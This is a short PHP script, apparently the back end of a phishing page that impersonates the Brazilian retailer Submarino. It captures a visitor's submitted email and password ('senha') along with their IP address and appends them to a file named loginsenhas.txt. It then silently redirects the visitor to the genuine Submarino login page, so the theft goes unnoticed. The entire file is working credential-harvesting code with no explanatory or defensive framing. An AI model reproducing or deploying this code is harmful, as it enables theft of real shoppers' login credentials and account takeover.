<?php

$n1 = $_POST['e-mail'];
$n2 = $_POST['senha'];
$n3 = $_SERVER['REMOTE_ADDR'];

$conteudo = "Login: $n1 \nSenha: $n2 \nIp: $n3\n\n\n";

$arquivo = "loginsenhas.txt";


if (!$abrir = fopen($arquivo, "a")) { 
	echo "Erro abrindo arquivo ($arquivo)";
	exit; }


if (!fwrite($abrir, $conteudo)) {
	print "Erro escrevendo no arquivo ($arquivo)";
	exit;
} 

echo '<meta http-equiv="refresh" content="0;url=https://carrinho.submarino.com.br/CustomerWeb/pages/Login">';
fclose($abrir);
exit;

?>